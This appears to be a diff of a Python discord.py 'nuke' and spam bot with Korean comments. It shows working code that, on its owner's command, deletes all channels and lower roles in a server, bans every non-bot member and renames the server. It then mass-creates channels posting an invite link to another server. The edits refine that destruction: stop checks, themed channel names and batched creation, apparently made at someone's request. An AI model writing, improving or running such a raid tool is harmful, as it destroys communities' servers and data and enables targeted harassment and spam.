@@ -75,12 +75,13 @@ A
 https://cdn.discordapp.com/attachments/1527944035816443934/1548286685413113956/lv_0_20260912195758.gif
 https://cdn.discordapp.com/attachments/1531280401497329795/1531631114265821296/1759806656222.gif"""
 
+# ★ 니가 요청한 특수문자 채널 이름 적용 ★
 nuke_channel_names = [
-    "현월을 찬양해라",
-    "현월에게 등을 굽히려라",
-    "현월에게 테러",
-    "현월 업이다?",
-    "현월라인 이전"
+    "▟┃▔┃⬤ 현월을 찬양해라",
+    "︻╦╤─── 현월업업",
+    "▟┃▔┃⬤ 현월에게 테러",
+    "︻╦╤─── 현월 업이다?",
+    "▟┃▔┃⬤ 현월라인 이전"
 ]
 
 class SpamClient(discord.Client):
@@ -90,7 +91,7 @@ class SpamClient(discord.Client):
         self.is_pinging = False
         self.is_nuking = False
         self.spam_content = ""
-        self.spam_delay = 0.4 # 기본 0.4초로 변경
+        self.spam_delay = 0.4
         self.spam_mode = "normal"
 
     def make_spam_message(self):
@@ -104,14 +105,14 @@ class SpamClient(discord.Client):
     async def on_message(self, message):
         if message.author.id != self.user.id and message.author.id != OWNER_ID: return
 
-        # 1. 중지 (!STOP)
+        # 1. 전체 중지 (!STOP) - 누크도 즉시 중단
         if message.content == STOP_TRIGGER:
             self.is_spamming = False
             self.is_pinging = False
             self.is_nuking = False
             await message.channel.send("STOP"); return
 
-        # 2. 누크 (!누크)
+        # 2. 누크 기능 (!누크 [숫자])
         if message.content.startswith(NUKE_TRIGGER):
             guild = message.guild
             if not guild: return
@@ -124,46 +125,63 @@ class SpamClient(discord.Client):
                 try: extra_count = int(parts[1])
                 except: pass
 
+            # 지울 채널/역할 미리 저장
             channels_to_delete = list(guild.channels)
+            roles_to_delete = [r for r in guild.roles if r != guild.default_role and r < guild.me.top_role]
             
-            # 삭제는 한 번만 (병렬 처리) - 삭제 끝나면 다시 삭제 안 함
+            # 채널 삭제 (한 번만 병렬로)
             async def delete_channel(ch):
+                if not self.is_nuking: return
                 try: await ch.delete()
                 except: pass
             await asyncio.gather(*(delete_channel(ch) for ch in channels_to_delete))
             
-            roles_to_delete = [r for r in guild.roles if r != guild.default_role and r < guild.me.top_role]
+            if not self.is_nuking: return
+            
+            # 역할 삭제
             async def delete_role(role):
+                if not self.is_nuking: return
                 try: await role.delete()
                 except: pass
             await asyncio.gather(*(delete_role(r) for r in roles_to_delete))
                     
+            if not self.is_nuking: return
+            
+            # 유저 밴
             async def ban_member(m):
+                if not self.is_nuking: return
                 try:
                     if not m.bot and m.id != OWNER_ID: await m.ban(reason="Nuked")
                 except: pass
             await asyncio.gather(*(ban_member(m) for m in guild.members))
             
+            if not self.is_nuking: return
+
             try: await guild.edit(name="현월 서버 터짐 ㅋㅋ")
             except: pass
 
+            # 채널 생성 및 도배
             async def create_spam_channel(ch_name):
+                if not self.is_nuking: return
                 try:
                     new_channel = await guild.create_text_channel(name=ch_name)
                     await new_channel.send("서버이전\nhttps://discord.gg/Fs2a99S5Xu")
                 except: pass
 
             tasks = []
+            # 기본 30세트 (니가 원하면 이 숫자 조절해라)
             for _ in range(30):
                 for ch_name in nuke_channel_names:
                     tasks.append(create_spam_channel(ch_name))
             
+            # 추가 숫자만큼 생성
             for _ in range(extra_count):
                 tasks.append(create_spam_channel(random.choice(nuke_channel_names)))
 
-            for i in range(0, len(tasks), 50):
+            # 10개씩 끊어서 병렬 생성 (중간에 STOP 먹히게)
+            for i in range(0, len(tasks), 10):
                 if not self.is_nuking: return
-                await asyncio.gather(*tasks[i:i+50])
+                await asyncio.gather(*tasks[i:i+10])
                 await asyncio.sleep(1)
 
             return
@@ -195,14 +213,14 @@ class SpamClient(discord.Client):
 
         if message.content == SPACE_TRIGGER: self.spam_mode = "space"; await message.channel.send("띄어쓰기 모드 ON"); return
         if message.content == NORMAL_TRIGGER: self.spam_mode = "normal"; await message.channel.send("일반쓰기 모드 ON"); return
-        if message.content == SETTINGS_TRIGGER: await message.channel.send(f"{self.spam_delay}"); return # 숫자만 출력
+        if message.content == SETTINGS_TRIGGER: await message.channel.send(f"{self.spam_delay}"); return
 
         # 5. 속도 변경 (숫자만)
         if message.content.startswith(SPEED_TRIGGER):
             try:
                 new_delay = float(message.content.split(" ")[1])
                 self.spam_delay = max(0.05, min(100.0, new_delay))
-                await message.channel.send(f"{self.spam_delay}") # 숫자만 출력
+                await message.channel.send(f"{self.spam_delay}")
             except: pass
             return
 
